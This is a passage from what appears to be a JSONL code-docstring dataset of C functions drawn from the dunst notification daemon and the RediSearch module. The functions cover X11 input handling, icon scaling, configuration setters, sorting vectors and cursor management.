h++) {\n                              unsigned char *iter_c = pixels_c + h * rowstride_c;\n                        const unsigned char *iter_p = pixels_p + h * rowstride_p;\n                        for (int w = 0; w < width; w++) {\n                                double alpha_factor = iter_p[3] / (double)0xff;\n                                iter_c[CAIRO_R] = (unsigned char)(iter_p[0] * alpha_factor + .5);\n                                iter_c[CAIRO_G] = (unsigned char)(iter_p[1] * alpha_factor + .5);\n                                iter_c[CAIRO_B] = (unsigned char)(iter_p[2] * alpha_factor + .5);\n                                iter_c[CAIRO_A] =                 iter_p[3];\n                                iter_c += 4;\n                                iter_p += n_channels;\n                        }\n                }\n\n        }\n}", "path": "dunst/src/icon.c", "commit_date": "2020-11-02 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/* Count the number of arguments in argv excluding the terminator \"--\" */\n", "func_signal": "int count_args(char *argv[], int argc)", "code": "{\n    for (int i = 0; i < argc; i++) {\n        if (strcmp(argv[i], \"--\") == 0)\n            return argc - 1;\n    }\n\n    return argc;\n}", "path": "dunst/dunstify.c", "commit_date": "2020-11-02 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Grab the given keyboard shortcut.\n */\n", "func_signal": "static int x_shortcut_grab(struct keyboard_shortcut *ks)", "code": "{\n        ASSERT_OR_RET(ks->is_valid, 1);\n        Window root;\n        root = RootWindow(xctx.dpy, DefaultScreen(xctx.dpy));\n\n        x_shortcut_setup_error_handler();\n\n        if (ks->is_valid) {\n                XGrabKey(xctx.dpy,\n                         ks->code,\n                         ks->mask,\n                         root,\n                         true,\n                         GrabModeAsync,\n                         GrabModeAsync);\n                XGrabKey(xctx.dpy,\n                         ks->code,\n                         ks->mask | x_numlock_mod(),\n                         root,\n                         true,\n                         GrabModeAsync,\n                         GrabModeAsync);\n        }\n\n        if (x_shortcut_tear_down_error_handler()) {\n                LOG_W(\"Unable to grab key '%s'.\", ks->str);\n                ks->is_valid = false;\n                return 1;\n        }\n        return 0;\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Convert x button code to linux event code\n * Returns 0 if button is not recognized.\n */\n", "func_signal": "static unsigned int x_mouse_button_to_linux_event_code(unsigned int x_button)", "code": "{\n        switch (x_button) {\n                case Button1:\n                        return BTN_LEFT;\n                case Button2:\n                        return BTN_MIDDLE;\n                case Button3:\n                        return BTN_RIGHT;\n                default:\n                        LOG_W(\"Unsupported mouse button: '%d'\", x_button);\n                        return 0;\n        }\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/* see screen.h */\n", "func_signal": "bool window_is_fullscreen(Window window)", "code": "{\n        bool fs = false;\n\n        ASSERT_OR_RET(window, false);\n\n        Atom has_wm_state = XInternAtom(xctx.dpy, \"_NET_WM_STATE\", True);\n        if (has_wm_state == None){\n                return false;\n        }\n\n        XFlush(xctx.dpy);\n        XSetErrorHandler(XErrorHandlerFullscreen);\n\n        Atom actual_type_return;\n        int actual_format_return;\n        unsigned long bytes_after_return;\n        unsigned char *prop_to_return;\n        unsigned long n_items;\n        int result = XGetWindowProperty(\n                        xctx.dpy,\n                        window,\n                        has_wm_state,\n                        0,                     /* long_offset */\n                        sizeof(window),        /* long_length */\n                        false,                 /* delete */\n                        AnyPropertyType,       /* req_type */\n                        &actual_type_return,\n                        &actual_format_return,\n                        &n_items,\n                        &bytes_after_return,\n                        &prop_to_return);\n\n        XFlush(xctx.dpy);\n        XSync(xctx.dpy, false);\n        XSetErrorHandler(NULL);\n\n        if (result == Success) {\n                for(int i = 0; i < n_items; i++) {\n                        Atom atom = ((Atom*) prop_to_return)[i];\n                        if (!atom)\n                                continue;\n\n                        char *s = XGetAtomName(xctx.dpy, atom);\n                        if (!s)\n                                continue;\n\n                        if (STR_EQ(s, \"_NET_WM_STATE_FULLSCREEN\"))\n                                fs = true;\n                        XFree(s);\n                        if (fs)\n                                break;\n                }\n        }\n\n        if (prop_to_return)\n                XFree(prop_to_return);\n\n        return fs;\n}", "path": "dunst/src/x11/screen.c", "commit_date": "2020-11-18 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Error handler for grabbing mouse and keyboard errors.\n */\n", "func_signal": "static int GrabXErrorHandler(Display *display, XErrorEvent *e)", "code": "{\n        dunst_grab_errored = true;\n        char err_buf[BUFSIZ];\n        XGetErrorText(display, e->error_code, err_buf, BUFSIZ);\n\n        if (e->error_code != BadAccess) {\n                DIE(\"%s\", err_buf);\n        } else {\n                LOG_W(\"%s\", err_buf);\n        }\n\n        return 0;\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * We trust that string_replace_all and string_replace properly reallocate\n * memory if the result is longer than the given string, no real way to test for\n * that far as I know.\n */\n", "func_signal": "TEST test_string_replace_all(void)", "code": "{\n        char *text = g_malloc(128 * sizeof(char));\n\n        strcpy(text, \"aaaaa\");\n        ASSERT_STR_EQ(\"bbbbb\", (text = string_replace_all(\"a\", \"b\", text)));\n\n        strcpy(text, \"\");\n        ASSERT_STR_EQ(\"\", (text = string_replace_all(\"a\", \"b\", text)));\n\n        strcpy(text, \"Nothing to replace\");\n        ASSERT_STR_EQ((text = string_replace_all(\"z\", \"a\", text)), \"Nothing to replace\");\n\n        strcpy(text, \"Reverse this\");\n        ASSERT_STR_EQ(\"Reverse sith\", (text = string_replace_all(\"this\", \"sith\", text)));\n\n        strcpy(text, \"abcdabc\");\n        ASSERT_STR_EQ(\"xyzabcdxyzabc\", (text = string_replace_all(\"a\", \"xyza\", text)));\n\n        g_free(text);\n        PASS();\n}", "path": "dunst/test/utils.c", "commit_date": "2018-11-15 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Glib leaves the option terminator \"--\" in the argv after parsing in some\n * cases. This function gets the specified argv element ignoring the first\n * terminator.\n *\n * See https://developer.gnome.org/glib/stable/glib-Commandline-option-parser.html#g-option-context-parse for details\n */\n", "func_signal": "char *get_argv(char *argv[], int index)", "code": "{\n    for (int i = 0; i <= index; i++) {\n        if (strcmp(argv[i], \"--\") == 0) {\n            return argv[index + 1];\n        }\n    }\n    return argv[index];\n}", "path": "dunst/dunstify.c", "commit_date": "2020-11-02 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Select the screen on which the Window\n * should be displayed.\n */\n", "func_signal": "const struct screen_info *get_active_screen(void)", "code": "{\n        int ret = 0;\n        bool force_follow_mouse = false;\n\n        if (settings.f_mode == FOLLOW_NONE) {\n                if (settings.monitor >= 0 && settings.monitor < screens_len) {\n                        ret = settings.monitor;\n                } else {\n                        ret = XDefaultScreen(xctx.dpy);\n                }\n\n                goto sc_cleanup;\n        } else {\n                int x, y;\n                assert(settings.f_mode == FOLLOW_MOUSE\n                                || settings.f_mode == FOLLOW_KEYBOARD);\n\n                x_follow_setup_error_handler();\n\n                Window root =\n                        RootWindow(xctx.dpy, DefaultScreen(xctx.dpy));\n\n                if (settings.f_mode == FOLLOW_KEYBOARD) {\n                        Window focused = get_focused_window();\n\n                        if (focused == 0) {\n                                /*\n                                 * This can happen in the case that the user\n                                 * just has the root window open, eg. in empty\n                                 * tags in dwm or similar window managers. In\n                                 * that case, fall back to FOLLOW_MOUSE, since\n                                 * it probably still has the right screen.\n                                 */\n                                force_follow_mouse = true;\n                        } else {\n                                Window child_return;\n                                XTranslateCoordinates(xctx.dpy, focused, root,\n                                                0, 0, &x, &y, &child_return);\n                        }\n                }\n\n                if (settings.f_mode == FOLLOW_MOUSE || force_follow_mouse) {\n                        int dummy;\n                        unsigned int dummy_ui;\n                        Window dummy_win;\n\n                        XQueryPointer(xctx.dpy,\n                                      root,\n                                      &dummy_win,\n                                      &dummy_win,\n                                      &x,\n                                      &y,\n                                      &dummy,\n                                      &dummy,\n                                      &dummy_ui);\n                }\n\n                for (int i = 0; i < screens_len; i++) {\n                        if (INRECT(x, y, screens[i].x, screens[i].y,\n                                         screens[i].w, screens[i].h)) {\n                                ret = i;\n                        }\n                }\n\n                if (ret > 0)\n                        goto sc_cleanup;\n\n                /* something seems to be wrong. Fall back to default */\n                ret = XDefaultScreen(xctx.dpy);\n                goto sc_cleanup;\n        }\nsc_cleanup:\n        x_follow_tear_down_error_handler();\n        assert(screens);\n        assert(ret >= 0 && ret < screens_len);\n        return &screens[ret];\n}", "path": "dunst/src/x11/screen.c", "commit_date": "2020-11-18 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Returns the modifier which is NumLock.\n */\n", "func_signal": "static KeySym x_numlock_mod(void)", "code": "{\n        static KeyCode nl = 0;\n        KeySym sym = 0;\n        XModifierKeymap *map = XGetModifierMapping(xctx.dpy);\n\n        if (!nl)\n                nl = XKeysymToKeycode(xctx.dpy, XStringToKeysym(\"Num_Lock\"));\n\n        for (int mod = 0; mod < 8; mod++) {\n                for (int j = 0; j < map->max_keypermod; j++) {\n                        if (map->modifiermap[mod*map->max_keypermod+j] == nl) {\n                                /* In theory, one could use `1 << mod`, but this\n                                 * could count as 'using implementation details',\n                                 * so use this large switch. */\n                                switch (mod) {\n                                case ShiftMapIndex:\n                                        sym = ShiftMask;\n                                        goto end;\n                                case LockMapIndex:\n                                        sym = LockMask;\n                                        goto end;\n                                case ControlMapIndex:\n                                        sym = ControlMask;\n                                        goto end;\n                                case Mod1MapIndex:\n                                        sym = Mod1Mask;\n                                        goto end;\n                                case Mod2MapIndex:\n                                        sym = Mod2Mask;\n                                        goto end;\n                                case Mod3MapIndex:\n                                        sym = Mod3Mask;\n                                        goto end;\n                                case Mod4MapIndex:\n                                        sym = Mod4Mask;\n                                        goto end;\n                                case Mod5MapIndex:\n                                        sym = Mod5Mask;\n                                        goto end;\n                                }\n                        }\n                }\n        }\n\nend:\n        XFreeModifiermap(map);\n        return sym;\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Setup the Error handler.\n */\n", "func_signal": "static void x_shortcut_setup_error_handler(void)", "code": "{\n        dunst_grab_errored = false;\n\n        XFlush(xctx.dpy);\n        XSetErrorHandler(GrabXErrorHandler);\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/**\n * Scales the given image dimensions if necessary according to the settings.\n *\n * @param w a pointer to the image width, to be modified in-place\n * @param h a pointer to the image height, to be modified in-place\n * @return TRUE if the dimensions were updated, FALSE if they were left unchanged\n */\n", "func_signal": "static bool icon_size_clamp(int *w, int *h)", "code": "{\n        int _w = *w, _h = *h;\n        int landscape = _w > _h;\n        int orig_larger = landscape ? _w : _h;\n        double larger = orig_larger;\n        double smaller = landscape ? _h : _w;\n        if (settings.min_icon_size && smaller < settings.min_icon_size) {\n                larger = larger / smaller * settings.min_icon_size;\n                smaller = settings.min_icon_size;\n        }\n        if (settings.max_icon_size && larger > settings.max_icon_size) {\n                smaller = smaller / larger * settings.max_icon_size;\n                larger = settings.max_icon_size;\n        }\n        if ((int) larger != orig_larger) {\n                *w = (int) (landscape ? larger : smaller);\n                *h = (int) (landscape ? smaller : larger);\n                return TRUE;\n        }\n        return FALSE;\n}", "path": "dunst/src/icon.c", "commit_date": "2020-11-02 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Check whether the user is currently idle.\n */\n", "func_signal": "bool x_is_idle(void)", "code": "{\n        XScreenSaverQueryInfo(xctx.dpy, DefaultRootWindow(xctx.dpy),\n                              xctx.screensaver_info);\n        if (settings.idle_threshold == 0) {\n                return false;\n        }\n        return xctx.screensaver_info->idle > settings.idle_threshold / 1000;\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "// This actually tests the buildsystem to make sure,\n// the build system hands over a correct version number\n// This is not testable via macros\n", "func_signal": "TEST assert_version_number(void)", "code": "{\n        ASSERTm(\"Version number is empty\",\n                0 != strcmp(VERSION, \"\"));\n\n        ASSERTm(\"Version number is not seeded by git\",\n                NULL == strstr(VERSION, \"non-git\"));\n        PASS();\n}", "path": "dunst/test/misc.c", "commit_date": "2018-11-12 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Setup the window\n */\n", "func_signal": "window x_win_create(void)", "code": "{\n        struct window_x11 *win = g_malloc0(sizeof(struct window_x11));\n\n        Window root;\n        int scr_n;\n        int depth;\n        Visual * vis;\n        XVisualInfo vi;\n        XSetWindowAttributes wa;\n\n        scr_n = DefaultScreen(xctx.dpy);\n        root = RootWindow(xctx.dpy, scr_n);\n        if (XMatchVisualInfo(xctx.dpy, scr_n, 32, TrueColor, &vi)) {\n                vis  = vi.visual;\n                depth = vi.depth;\n        } else {\n                vis = DefaultVisual(xctx.dpy, scr_n);\n                depth = DefaultDepth(xctx.dpy, scr_n);\n        }\n\n        wa.override_redirect = true;\n        wa.background_pixmap = None;\n        wa.background_pixel = 0;\n        wa.border_pixel = 0;\n        wa.colormap = XCreateColormap(xctx.dpy, root, vis, AllocNone);\n        wa.event_mask =\n            ExposureMask | KeyPressMask | VisibilityChangeMask |\n            ButtonReleaseMask | FocusChangeMask| StructureNotifyMask;\n\n        const struct screen_info *scr = get_active_screen();\n        win->xwin = XCreateWindow(xctx.dpy,\n                                 root,\n                                 scr->x,\n                                 scr->y,\n                                 scr->w,\n                                 1,\n                                 0,\n                                 depth,\n                                 CopyFromParent,\n                                 vis,\n                                 CWOverrideRedirect | CWBackPixmap | CWBackPixel | CWBorderPixel | CWColormap | CWEventMask,\n                                 &wa);\n\n        x_set_wm(win->xwin);\n        settings.transparency =\n            settings.transparency > 100 ? 100 : settings.transparency;\n        setopacity(win->xwin,\n                   (unsigned long)((100 - settings.transparency) *\n                                   (0xffffffff / 100)));\n\n        win->root_surface = cairo_xlib_surface_create(xctx.dpy, win->xwin,\n                                                      vis,\n                                                      WIDTH, HEIGHT);\n        win->c_ctx = cairo_create(win->root_surface);\n\n        win->esrc = x_win_reg_source(win);\n\n        /* SubstructureNotifyMask is required for receiving CreateNotify events\n         * in order to raise the window when something covers us. See #160\n         *\n         * PropertyChangeMask is requred for getting screen change events when follow_mode != none\n         *                    and it's also needed to receive\n         *                    XA_RESOURCE_MANAGER events to update the dpi when\n         *                    the xresource value is updated\n         */\n        long root_event_mask = SubstructureNotifyMask | PropertyChangeMask;\n        if (settings.f_mode != FOLLOW_NONE) {\n                root_event_mask |= FocusChangeMask;\n        }\n        XSelectInput(xctx.dpy, root, root_event_mask);\n\n        return (window)win;\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/*\n * Parse a string into a modifier mask.\n */\n", "func_signal": "KeySym x_shortcut_string_to_mask(const char *str)", "code": "{\n        if (STR_EQ(str, \"ctrl\")) {\n                return ControlMask;\n        } else if (STR_EQ(str, \"mod4\")) {\n                return Mod4Mask;\n        } else if (STR_EQ(str, \"mod3\")) {\n                return Mod3Mask;\n        } else if (STR_EQ(str, \"mod2\")) {\n                return Mod2Mask;\n        } else if (STR_EQ(str, \"mod1\")) {\n                return Mod1Mask;\n        } else if (STR_EQ(str, \"shift\")) {\n                return ShiftMask;\n        } else {\n                LOG_W(\"Unknown Modifier: '%s'\", str);\n                return 0;\n        }\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "/* TODO move to x_mainloop_* */\n/*\n * Handle incoming mouse click events\n */\n", "func_signal": "static void x_handle_click(XEvent ev)", "code": "{\n        unsigned int linux_code = x_mouse_button_to_linux_event_code(ev.xbutton.button);\n\n        if (linux_code == 0) {\n                return;\n        }\n\n        bool button_state;\n        if(ev.type == ButtonRelease) {\n                button_state = false; // button is up\n        } else {\n                // this shouldn't happen, because this function\n                // is only called when it'a a ButtonRelease event\n                button_state = true; // button is down\n        }\n\n        input_handle_click(linux_code, button_state, ev.xbutton.x, ev.xbutton.y);\n}", "path": "dunst/src/x11/x.c", "commit_date": "2020-12-28 00:00:00", "repo_name": "dunst-project/dunst", "stars": 4223, "license": "other", "language": "c", "size": 7197}
{"docstring": "// GC_SCANSIZE\n", "func_signal": "CONFIG_SETTER(setGcScanSize)", "code": "{\n  int acrc = AC_GetSize(ac, &config->gcScanSize, AC_F_GE1);\n  RETURN_STATUS(acrc);\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "// MIN_PHONETIC_TERM_LEN\n", "func_signal": "CONFIG_SETTER(setForkGcInterval)", "code": "{\n  int acrc = AC_GetSize(ac, &config->forkGcRunIntervalSec, AC_F_GE1);\n  RETURN_STATUS(acrc);\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "// INDEX_THREADS\n", "func_signal": "CONFIG_SETTER(setIndexThreads)", "code": "{\n  int acrc = AC_GetSize(ac, &config->indexPoolSize, AC_F_GE1);\n  CHECK_RETURN_PARSE_ERROR(acrc);\n  config->poolSizeNoAuto = 1;\n  return REDISMODULE_OK;\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "/* Save a sorting vector to rdb. This is called from the doc table */\n", "func_signal": "void SortingVector_RdbSave(RedisModuleIO *rdb, RSSortingVector *v)", "code": "{\n  if (!v) {\n    RedisModule_SaveUnsigned(rdb, 0);\n    return;\n  }\n  RedisModule_SaveUnsigned(rdb, v->len);\n  for (int i = 0; i < v->len; i++) {\n    RSValue *val = v->values[i];\n    if (!val) {\n      RedisModule_SaveUnsigned(rdb, RSValue_Null);\n      continue;\n    }\n    RedisModule_SaveUnsigned(rdb, val->t);\n    switch (val->t) {\n      case RSValue_String:\n        // save string - one extra byte for null terminator\n        RedisModule_SaveStringBuffer(rdb, val->strval.str, val->strval.len + 1);\n        break;\n\n      case RSValue_Number:\n        // save numeric value\n        RedisModule_SaveDouble(rdb, val->numval);\n        break;\n      // for nil we write nothing\n      default:\n        break;\n    }\n  }\n}", "path": "RediSearch/src/sortable.c", "commit_date": "2020-12-30 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "/* Create a sorting vector of a given length for a document */\n", "func_signal": "RSSortingVector *NewSortingVector(int len)", "code": "{\n  if (len > RS_SORTABLES_MAX) {\n    return NULL;\n  }\n  RSSortingVector *ret = rm_calloc(1, sizeof(RSSortingVector) + len * (sizeof(RSValue*)));\n  ret->len = len;\n  // set all values to NIL\n  for (int i = 0; i < len; i++) {\n    ret->values[i] = RSValue_IncrRef(RS_NullVal());\n  }\n  return ret;\n}", "path": "RediSearch/src/sortable.c", "commit_date": "2020-12-30 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "/**\n * Cursor ID is a 64 bit opaque integer. The upper 32 bits consist of the PID\n * of the process which generated the cursor, and the lower 32 bits consist of\n * the counter at the time at which it was generated. This doesn't make it\n * particularly \"secure\" but it does prevent accidental collisions from both\n * a stuck client and a crashed server\n */\n", "func_signal": "static uint64_t CursorList_GenerateId(CursorList *curlist)", "code": "{\n  uint64_t id = lrand48() + 1;  // 0 should never be returned as cursor id\n  return id;\n}", "path": "RediSearch/src/cursor.c", "commit_date": "2020-09-17 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "// MAXSEARCHRESULTS\n", "func_signal": "CONFIG_SETTER(setMaxSearchResults)", "code": "{\n  long long newsize = 0;\n  int acrc = AC_GetLongLong(ac, &newsize, 0);\n  CHECK_RETURN_PARSE_ERROR(acrc);\n  if (newsize == -1) {\n    newsize = UINT64_MAX;\n  }\n  config->maxSearchResults = newsize;\n  return REDISMODULE_OK;\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "/* Load a sorting vector from RDB */\n", "func_signal": "RSSortingVector *SortingVector_RdbLoad(RedisModuleIO *rdb, int encver)", "code": "{\n\n  int len = (int)RedisModule_LoadUnsigned(rdb);\n  if (len > RS_SORTABLES_MAX || len <= 0) {\n    return NULL;\n  }\n  RSSortingVector *vec = NewSortingVector(len);\n  for (int i = 0; i < len; i++) {\n    RSValueType t = RedisModule_LoadUnsigned(rdb);\n\n    switch (t) {\n      case RSValue_String: {\n        size_t len;\n        // strings include an extra character for null terminator. we set it to zero just in case\n        char *s = RedisModule_LoadStringBuffer(rdb, &len);\n        s[len - 1] = '\\0';\n        vec->values[i] = RS_StringValT(rm_strdup(s), len - 1, RSString_RMAlloc);\n        RedisModule_Free(s);\n        break;\n      }\n      case RS_SORTABLE_NUM:\n        // load numeric value\n        vec->values[i] = RS_NumVal(RedisModule_LoadDouble(rdb));\n        break;\n      // for nil we read nothing\n      case RS_SORTABLE_NIL:\n      default:\n        vec->values[i] = RS_NullVal();\n        break;\n    }\n  }\n  return vec;\n}", "path": "RediSearch/src/sortable.c", "commit_date": "2020-12-30 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "/* Internal compare function between members of the sorting vectors, sorted by sk */\n", "func_signal": "int RSSortingVector_Cmp(RSSortingVector *self, RSSortingVector *other, RSSortingKey *sk,\n                        QueryError *qerr)", "code": "{\n  RSValue *v1 = self->values[sk->index];\n  RSValue *v2 = other->values[sk->index];\n  int rc = RSValue_Cmp(v1, v2, qerr);\n  return sk->ascending ? rc : -rc;\n}", "path": "RediSearch/src/sortable.c", "commit_date": "2020-12-30 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "/**\n * Garbage collection:\n *\n * Garbage collection is performed:\n *\n * - Every <n> operations\n * - If there are too many active cursors and we want to create a cursor\n * - If NextTimeout is set and is earlier than the current time.\n *\n * Garbage collection is throttled within a given interval as well.\n */\n", "func_signal": "static int Cursors_GCInternal(CursorList *cl, int force)", "code": "{\n  uint64_t now = curTimeNs();\n  if (cl->nextIdleTimeoutNs && cl->nextIdleTimeoutNs > now) {\n    return -1;\n  } else if (!force && now - cl->lastCollect < RSCURSORS_SWEEP_THROTTLE) {\n    return -1;\n  }\n\n  cl->lastCollect = now;\n  cursorGcCtx ctx = {.now = now};\n  Cursors_ForEach(cl, cursorGcCb, &ctx);\n  return ctx.numCollected;\n}", "path": "RediSearch/src/cursor.c", "commit_date": "2020-09-17 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "/**\nWrite an integer to the vector.\n@param w a vector writer\n@param i the integer we want to write\n@retur 0 if we're out of capacity, the varint's actual size otherwise\n*/\n", "func_signal": "size_t VVW_Write(VarintVectorWriter *w, uint32_t i)", "code": "{\n  Buffer_Reserve(&w->buf, 16);\n  size_t n = WriteVarintBuffer(i - w->lastValue, &w->buf);\n  if (n != 0) {\n    w->nmemb += 1;\n    w->lastValue = i;\n  }\n  return n;\n}", "path": "RediSearch/src/varint.c", "commit_date": "2020-04-06 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "// SAFEMODE\n", "func_signal": "CONFIG_SETTER(setSafemode)", "code": "{\n  config->concurrentMode = 0;\n  return REDISMODULE_OK;\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "// MAXAGGREGATERESULTS\n", "func_signal": "CONFIG_SETTER(setMaxAggregateResults)", "code": "{\n  long long newsize = 0;\n  int acrc = AC_GetLongLong(ac, &newsize, 0);\n  CHECK_RETURN_PARSE_ERROR(acrc);\n  if (newsize == -1) {\n    newsize = UINT64_MAX;\n  }\n  config->maxAggregateResults = newsize;\n  return REDISMODULE_OK;\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "// MAXEXPANSIONS MAXPREFIXEXPANSIONS\n", "func_signal": "CONFIG_SETTER(setMaxExpansions)", "code": "{\n  int acrc = AC_GetLongLong(ac, &config->maxPrefixExpansions, AC_F_GE1);\n  RETURN_STATUS(acrc);\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "/* Doesn't lock - simply deallocates and decrements */\n", "func_signal": "static void Cursor_FreeInternal(Cursor *cur, khiter_t khi)", "code": "{\n  /* Decrement the used count */\n  RS_LOG_ASSERT(khi != kh_end(cur->parent->lookup), \"Iterator shouldn't be at end of cursor list\");\n  RS_LOG_ASSERT(kh_get(cursors, cur->parent->lookup, cur->id) != kh_end(cur->parent->lookup),\n                                                    \"Cursor was not found\");\n  kh_del(cursors, cur->parent->lookup, khi);\n  RS_LOG_ASSERT(kh_get(cursors, cur->parent->lookup, cur->id) == kh_end(cur->parent->lookup),\n                                                    \"Failed to delete cursor\");\n  cur->specInfo->used--;\n  if (cur->execState) {\n    Cursor_FreeExecState(cur->execState);\n    cur->execState = NULL;\n  }\n  rm_free(cur);\n}", "path": "RediSearch/src/cursor.c", "commit_date": "2020-09-17 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "// MAXDOCTABLESIZE\n", "func_signal": "CONFIG_SETTER(setMaxDocTableSize)", "code": "{\n  size_t newsize = 0;\n  int acrc = AC_GetSize(ac, &newsize, AC_F_GE1);\n  CHECK_RETURN_PARSE_ERROR(acrc);\n  if (newsize > MAX_DOC_TABLE_SIZE) {\n    QueryError_SetError(status, QUERY_ELIMIT, \"Value exceeds maximum possible document table size\");\n    return REDISMODULE_ERR;\n  }\n  config->maxDocTableSize = newsize;\n  return REDISMODULE_OK;\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "/* Get the field index by name from the sorting table. Returns -1 if the field was not found */\n", "func_signal": "int RSSortingTable_GetFieldIdx(RSSortingTable *tbl, const char *field)", "code": "{\n\n  if (!tbl) return -1;\n  for (int i = 0; i < tbl->len; i++) {\n    if (!strcasecmp(tbl->fields[i].name, field)) {\n      return i;\n    }\n  }\n  return -1;\n}", "path": "RediSearch/src/sortable.c", "commit_date": "2020-12-30 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "// MINPREFIX\n", "func_signal": "CONFIG_SETTER(setMinPrefix)", "code": "{\n  int acrc = AC_GetLongLong(ac, &config->minTermPrefix, AC_F_GE1);\n  RETURN_STATUS(acrc);\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "// ON_TIMEOUT\n", "func_signal": "CONFIG_SETTER(setOnTimeout)", "code": "{\n  const char *policy;\n  int acrc = AC_GetString(ac, &policy, NULL, 0);\n  CHECK_RETURN_PARSE_ERROR(acrc);\n  RSTimeoutPolicy top = TimeoutPolicy_Parse(policy, strlen(policy));\n  if (top == TimeoutPolicy_Invalid) {\n    RETURN_ERROR(\"Invalid ON_TIMEOUT value\");\n  }\n  config->timeoutPolicy = top;\n  return REDISMODULE_OK;\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
